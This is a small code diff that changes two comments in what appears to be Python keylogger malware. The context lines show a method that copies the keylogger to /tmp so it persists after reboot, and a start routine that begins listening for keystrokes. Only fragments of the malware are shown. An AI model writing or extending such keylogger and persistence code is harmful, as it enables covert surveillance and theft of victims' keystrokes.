@@ -254,7 +254,7 @@ class Keylogger:
 
 	'''
 	replicate keylogger in /tmp/folder to
-	continue to turn on keylogger after reboot
+	continue to activate keylogger after reboot
 	'''
 	def replicate(self):
 		# create file run.py in location of collected data
@@ -269,7 +269,7 @@ MAIN IS HERE!
 *************
 '''
 def initiate():
-	# instantiating object
+	# instantiating Keylogger object
 	my_obj = Keylogger()
 	# invoke this function to begin listening
 	my_obj.start_listening()
